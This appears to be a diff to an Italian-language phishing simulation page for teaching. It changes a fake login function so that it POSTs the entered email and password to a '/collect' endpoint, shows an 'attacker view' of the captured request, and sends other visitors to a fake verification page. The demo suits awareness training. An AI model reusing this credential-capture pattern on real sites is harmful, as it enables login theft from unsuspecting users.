@@ -67,11 +67,20 @@ function fakeLogin() {
   const password = document.getElementById("password").value;
   const timestamp = new Date().toISOString();
 
-  /* ===== Console (invisibile all'utente) ===== */
-  console.log("[SIMULAZIONE PHISHING]");
-  console.log("Email:", email);
-  console.log("Password:", password);
-  console.log("Timestamp:", timestamp);
+  /* ===== POST REALE (didattica) ===== */
+  fetch("/collect", {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify({
+      email: email,
+      password: password,
+      timestamp: timestamp
+    })
+  }).catch(() => {
+    // L'endpoint non esiste: errore previsto
+  });
 
   /* ===== Vista attaccante ===== */
   if (window.location.hash === "#attacker") {
@@ -79,12 +88,16 @@ function fakeLogin() {
     document.getElementById("attackerView").classList.remove("hidden");
 
     document.getElementById("dump").textContent =
-`Email: ${email}
-Password: ${password}
-Timestamp: ${timestamp}`;
+`POST /collect HTTP/1.1
+Content-Type: application/json
+
+{
+  "email": "${email}",
+  "password": "${password}",
+  "timestamp": "${timestamp}"
+}`;
   } else {
-    /* ===== Comportamento normale ===== */
-    setTimeout(function () {
+    setTimeout(() => {
       window.location.href = "verifica-completata.html";
     }, 700);
   }
@@ -92,6 +105,7 @@ Timestamp: ${timestamp}`;
   return false;
 }
 </script>
+
 
 </body>
 </html>
